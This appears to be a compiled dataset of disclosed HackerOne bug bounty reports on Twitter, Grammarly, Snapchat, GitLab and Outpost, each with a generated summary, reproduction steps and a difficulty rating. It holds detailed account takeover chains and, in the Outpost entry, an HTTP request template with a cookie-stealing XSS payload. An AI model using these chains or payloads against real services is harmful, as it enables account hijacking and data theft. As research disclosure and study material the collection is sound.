[This a serious security vulnerability, as It could lead to a hacker completely taking over the user's account by overriding twitter's security protocol as they could use this technique to bypass the password screen which would enable them to update the email ID and the phone number against the victim's account thereby providing the hacker with complete authority/access over the victim's account]
Supporting Material/References:
[Please see attached the video for demonstration and steps to reproduce this security vulnerability]
Impact
An attacker could potentially capitalize on the 'hijacked' session and completely take over the victim's twitter account by modifying the email id and mobile phone number of the user without having to authenticate themselves with the correct password. As a result, It would defeat Twitter's additional layer of security i.e. password prompt and would lead to the user being locked out from ever accessing their twitter account again.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker with a hijacked session to bypass the password authentication required to update sensitive account information (email and phone number) by intercepting and modifying the server response. The attacker can then take complete control of the victim's account by changing these details and resetting the password.

Steps to Reproduce:
1. Go to Settings and Privacy -> Accounts
2. Click on Email -> Update email address or Phone -> Add/Update phone number
3. Enter any random password and Click on 'Next'
4. Intercept the request using a proxy tool (e.g., Burp Suite)
5. Copy the flow token from the intercepted request
6. Forward the client request to the server and intercept the response
7. Modify the intercepted server response with a valid JSON response containing the copied flow token
8. Forward the modified server response to the client
9. Bypass the password screen and proceed to update the email or phone number
Exploitation Difficulty:
The vulnerability involves multiple components including session hijacking, request interception, and response manipulation. The attacker needs to understand the flow token mechanism and how to craft a valid server response. The interaction between these components is subtle and requires precise manipulation of the application state.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/976603: Ability to DOS any organization's SSO and open up the door to account takeovers
================================================================================
RAW DESCRIPTION:

Summary:
There's an interesting issue I've spent quite a few days trying to escalate but can't figure out. The impact at this point is that I can DOS any SSO integration making it so nobody in that organization can login. I can also get users to inadvertently SSO into my attacker organization, and then take over their account from there. For existing accounts this would require a victim to click "join", however I think that's likely given the fact that they are SSOing for the first time expecting to join an organization.
The strange behavior and why I think it might be possible to escalate further, is that I can have you authenticate against one SSO instance, but have you get added to a completely separate one. So that means there is some sketchy logic which can potentially allow an attacker to authenticate against their own SSO instance, and get added to someone else's organization. I'm not sure if it's possible to get this with zero user interaction, but I will keep trying and update the report if I figure out a way.
The bug stems from the fact that you can create an entityId identical to that of another organization except with a space at the end. The application logic then prioritizes that new entityId to add the user to after authenticating against the correct one. So if you have myentity as the legitimate entity, and an attacker sets their entity to myentity[SPACE] (with a space at the end); users attempting to authenticate into the legitimate myentity will technically authenticate against it, but then the application attempts to log them into the attacker's organization. The result of this is a DOS since legitimate users can no longer access their organization. The interesting part of the bug is that if the user is deleted from their original organization (or a new user attempts to SSO), they will then be authenticating against their original organization, but get added into the attacker's organization. So it seems the SAML Response is checked against a trim(issuer), but when trying to place the user into an organization, the entity with the space is always prioritized.
The steps below will demonstrate this behavior:
Steps To Reproduce:
Setup SSO and confirm you can login.
Create a new Grammarly business account and use the same entityId (Identity Provider Issuer) you used in step 1, except add a space to the end of it. Use a different keypair for this organization as well.
Wait 2 minutes for the change to propagate, then try logging into the same account from step 1, and notice you now get an error.
At this point the victim organization is DOS'd. To confirm the strange behavior discussed above, you can delete that user from the victim organization and attempt to login again. Notice you will now end up getting provisioned to the attacker's organization, even though you signed the SAML Response with the victim organization's private key.
Once you are provisioned into the attacker's organization, the attacker can then change their entityId to something brand new, and login to the victim's account using the keypair they own. If this was a converted personal account, you can then access that user's personal documents.
Impact
Ability to effectively disable SSO for any organization.
Ability to get users provisioned into an attacker's account, which they can then takeover.
Thanks,
-- Tanner



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to DoS any organization's SSO by creating a duplicate entityId with a trailing space, which the system incorrectly prioritizes. Additionally, users authenticating against the legitimate SSO can be redirected to the attacker's organization, enabling account takeover under certain conditions.

Steps to Reproduce:
1. Setup SSO and confirm you can login.
2. Create a new Grammarly business account with the same entityId as the target organization, but add a space at the end. Use a different keypair.
3. Wait 2 minutes for the change to propagate, then attempt to login to the target organization. Observe the error, confirming the DoS.
4. Delete the user from the victim organization and attempt to login again. The user is now provisioned into the attacker's organization.
5. The attacker can then change their entityId and use their keypair to login to the victim's account, potentially accessing personal documents.
Exploitation Difficulty:
The attack involves understanding and manipulating SAML authentication flows, exploiting a subtle logic flaw in entityId comparison (trim vs. non-trim), and requires setting up a malicious SSO instance with specific configurations. The interaction between these components is non-obvious and requires deep knowledge of SSO implementations.

--------------------------------------------------------------------------------



Authentication Bypass Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/265943: Stealing SSO Login Tokens (snappublisher.snapchat.com)
================================================================================
RAW DESCRIPTION:

Description
Attacker can steal SSO login tokens for snappublisher.snapchat.com by chaining different flaws in SSO and Snapchat’s Snappublisher tool. Detailed attack flow is as follows.
Attack Flow
1.. Snapchat fetches a SSO LOGIN TOKEN from accounts.snapchat.com to login into different products of Snapchat i.e. SnapPublisher, Ads Manager, Business Manager, etc. provided that user is logged into accounts.snapchat.com.
eg. To login into SnapPublisher following requests are made …
1] https://accounts.snapchat.com/accounts/login?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/sso_continue
2] 302 redirect to
https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https%3A%2F%2Fsnappublisher.snapchat.com%2Fsso_continue
3] again 302 redirect to
https://snappublisher.snapchat.com/sso_continue?ticket=redacted
So, a SSO login token ticket is sent from accounts.snapchat.com to snappublisher.snapchat.com which is used to login the user. And is also used in Authorization header when making requests to API.
Now, we are going to steal this SSO login token ticket which will allow us to login and control victim’s account.
2.. On snappublisher.snapchat.com, I was able to upload a svg image to google cloud storage, using which I run my javascript code.
Note: Use import from site functionality via https://snappublisher.snapchat.com/snaps/create/new and import my xss-svg image from here (███████/tokenstealer.svg). This alerts and logs #hashfragment in the console.
I have already did this in my POC so this is just for understanding purpose. My image URL is https://snappublisher.snapchat.com/api/v1/media/████████/file/somthine.svg?%23pranav
3.. Now, other flaws in SSO …
1] In this URL
https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/████████/file/somthine.svg?%23pranav
referrer parameter can be controlled and any snappublisher.snapchat.com URL is allowed.
Also, %23pranav, this #hashfragment is allowed in referrer parameter.
I take advantage of both these flaws to flow the SSO login token to my website or land to a page which I control.
Note: #hashfragment is send further by browser for 302 / 307 redirects.
4.. CSRF Login flaw
SSO functionality is vulnerable to CSRF attack so I can login other people into my account. I use this functionality to login user into my account.
5.. Token doesn’t expire flaw
Once the SSO login token is used, it doesn’t expire and can be reused multiple times.
So, simple attack flow is as follows :
User is logged into accounts.snapchat.com.
Attacker logs user into his/her snappublisher.snapchat.com account via CSRF login flaw.
Now, attacker makes a request to fetch SSO login token https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/█████████/file/somthine.svg?%23pranav and redirects the token in #hashfragment to https://snappublisher.snapchat.com/api/v1/media/█████/file/somthine.svg?%23pranav
https://snappublisher.snapchat.com/api/v1/media/████/file/somthine.svg?%23pranav this redirects with 307 status code to storage.googleapis.com/creativesuite-prod-media/* with SSO login token ticket in #hashfragment carried forward by browser.
Svg image executes my js code and alerts and logs the SSO login token ticket in the console.
I can use the ticket to login into victim’s account. Via https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>
Proof Of Concept
Video POC : █████████(Unlisted video on youtube)
Login into your account on accounts.snapchat.com.
Login into your SnapPublisher account snappublisher.snapchat.com.
Visit (█████) which fetches user’s SSO login token which can be used to login. (This alerts and logs the token in console.)
Use the token via https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>
Impact
Gain unauthorized access to Snappublisher account.
Can use the SSO login token to make API requests.
Recommendations
For SSO functionality …
1] Add state param to prevent CSRF login on https://snappublisher.snapchat.com/sso_continue?ticket=<token>
2] In referrer param of the following URL
https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/██████████/file/somthine.svg?%23pranav disallow #hashfragments to be included.
3] Make the referrer param of the following URL
https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/███████/file/somthine.svg?%23pranav more specific and restricted similar to your OAuth2 adsapi.
4] SSO login token should be one time use and should not be able to use it again and again.
For SnapPublisher
1] I observed you are using Google Cloud Storage, so blocking svg images or disallowing any uploads of svg-xss images will further enhance security. Otherwise, one can easily get xss on storage.google
Let me know if you need any help. :-)
Regards,
Pranav Hivarekar



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to steal SSO login tokens for SnapPublisher by chaining multiple flaws, including CSRF, token reuse, and SVG-based XSS. The attacker can then use the stolen token to gain unauthorized access to the victim's SnapPublisher account.

Steps to Reproduce:
1. Upload an SVG image with malicious JavaScript to Google Cloud Storage via SnapPublisher's import functionality.
2. Use CSRF to log the victim into the attacker's SnapPublisher account.
3. Trigger a request to fetch the SSO login token, redirecting it to the malicious SVG via the referrer parameter and hash fragment.
4. Capture the SSO token from the SVG's JavaScript execution and use it to log into the victim's account.
Exploitation Difficulty:
The attack involves multiple components (CSRF, token handling, XSS via SVG) and requires understanding subtle interactions between them, such as how the referrer parameter and hash fragments are handled during SSO token redirection. Additionally, the attack manipulates complex application states (SSO flow, token validation) and includes novel logic not commonly seen in other applications.

--------------------------------------------------------------------------------



Incorrect Authorization Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/498964: Full access to internal Gitlab instances at redash.gitlab.com, dashboards.gitlab.com, prometheus.gitlab.com
================================================================================
RAW DESCRIPTION:

Summary:
Lack of proper ticket trick security leads to internal access on Gitlab instances. **I did not use support.gitlab.com instead just using support@gitlab.com email was suffice.
Description:
Getting a support@gitlab.com Google Account
After the Ticket Trick attack that Inti reported and disclosed, many companies including Gitlab added proper security measures to prevent this kind of attack. What companies did not realize is that Zendesk has a feature that can be exploited by attackers other than the CC feature.
In this case, Gitlab has blocked sending emails to support+*@gitlab.com which prevents Ticket Trick that Inti came up with. However, the CC feature along with the Zendesk's feature can lead to further exploitation.
To begin with, I sent an email to support@gitlab.com. After this, an automated reply was sent by Gitlab with confirmation that my ticket went through. Next, I went to accounts.google.com and registered support@gitlab.com. For the firstname and last name I copied a special hash for the ticket. Zendesk as a feature has a special hash for each ticket that is generated in the system This hash is like the key in a dictionary and can be used to add more content to the ticket. So by getting that hash and sending the request, Google allegedly sends an email to verify.
What happened here was due to Zendesk's own security measures, the first email from Google will be set as private because they are not CCed to my ticket. So then, I replied to the support ticket from Gitlab and in CC put noreply@google.com. Once this was done, I replayed the request in Google and again tried to verify support@gitlab.com this time the ticket had the verification code public.
{F427388}
If you check the image on the top right corner you can see the hash repeated twice because I put that as a first and last name.
Once this was done, I had a verified support@gitlab.com email.
{F427390}
Next, I went to crt.sh to search for gitlab.com domains and found 3 domains that stood out:
prometheus.gitlab.com
{F427391}
redash.gitlab.com
{F427393}
<image_0>
Impact
Getting access to internal applications.



================================================================================
Vulnerability Description:
The vulnerability involves exploiting Zendesk's ticket system and Google's email verification process to gain unauthorized access to internal GitLab instances. By manipulating the ticket hash and leveraging Zendesk's features, an attacker can verify a support@gitlab.com email and use it to access sensitive internal systems.

Steps to Reproduce:
1. Send an email to support@gitlab.com to initiate a support ticket.
2. Register a Google account with the email support@gitlab.com, using the ticket hash as the first and last name.
3. Reply to the support ticket from GitLab, CC'ing noreply@google.com to make the verification code public.
4. Verify the support@gitlab.com email using the public verification code.
5. Use the verified email to gain access to internal GitLab instances like redash.gitlab.com, dashboards.gitlab.com, and prometheus.gitlab.com.
Exploitation Difficulty:
This vulnerability requires understanding and manipulating multiple systems (Zendesk, Google email verification, GitLab's internal domains) and involves subtle interactions between these components. The attacker must also recognize the opportunity to use the ticket hash in a non-obvious way to bypass security measures.

--------------------------------------------------------------------------------



Insecure Direct Object Reference (IDOR) Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/854290: IDOR on update user preferences
================================================================================
RAW DESCRIPTION:

Summary:
Team member with role USER can change data of any user in the team, or steal his cookies, or steal the account of victim via forget password function.
Steps To Reproduce:
Login in as user1 (the user with role admin) and invite user2 (set his role to user).
Login in as user2, open Mail tab and select user1 from Conversation assignment dropdown (see s1.jpg (F796149) attachment).
Open network tools in the browser devTools or open local proxy and copy UserUuid (da4f313f-e21e-4b5f-b2da-42d9864716f6 in my case) of the user1 from the following request: https://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6.
Use template request1 to create http request. Change {user1-uuid} to user1 Uuid, {user2-cookie} to user2 cookie. In the request body: {attacker-email} to email controlled by user2, signature to the following: <p style=\"margin:0;\">User Signature2<img src=x onerror=alert(document.cookie) ></p>. Send request.
Login in as user1. Open https://app.outpost.co/settings/preferences, alert with user1 cookie will appear (see s2.jpg (F796148) attachment).
Open https://app.outpost.co/sign-in/help and paste {attacker-email}. Open email client, click the link to restore password, enter a new password. Now you can login in using user1 email address and password entered on the previos step.
Supporting Material/References:
request1 template:
Code 896 Bytes
1PUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0
2Host: api.outpost.co
3Content-Length: 434
4Sec-Fetch-Dest: empty
5X-Requested-With: XMLHttpRequest
6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
7Dnt: 1
8Content-Type: application/json
9Accept: */*
10Origin: https://app.outpost.co
11Sec-Fetch-Site: same-site
12Sec-Fetch-Mode: cors
13Referer: https://app.outpost.co/
14Accept-Encoding: gzip, deflate, br
15Accept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7
16Cookie: auth={user2-cookie}
17
18{
19  "firstName": "user1-changed-by-user2",
20  "lastName": "null",
21  "email": "{attacker-email}",
22  "role": "USER",
23  "defaultMailboxUuid": "",
24  "mailboxUuids": [
25    "e4a63ae3-bb10-46f8-be28-a2660a2344ec"
26  ],
27  "signature": "{signature}",
28  "timezone": "Europe/Moscow",
29  "defaultSendAndResolve": false,
30  "selectFirstConversation": true
31}
Impact
An attacker can change data of any user in the team, or steal his cookies, or steal account of victim via forget password function.



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability allows a user with USER role to modify any user's preferences, including injecting malicious scripts to steal cookies or hijack accounts via the password reset function.

Steps to Reproduce:
1. Login as user1 (admin) and invite user2 with USER role.
2. Login as user2, access Mail tab, and select user1 from Conversation assignment dropdown.
3. Extract user1's UserUuid from the network request.
4. Use the template request to send a PUT request to update user1's preferences, including a malicious signature.
5. Login as user1 and trigger the XSS payload to steal cookies.
6. Use the forget password function with the attacker's email to hijack user1's account.
Exploitation Difficulty:
The attack involves multiple steps including session manipulation, XSS payload injection, and account takeover via password reset. The interaction between these components is non-obvious, requiring the attacker to understand and chain several vulnerabilities together.

--------------------------------------------------------------------------------



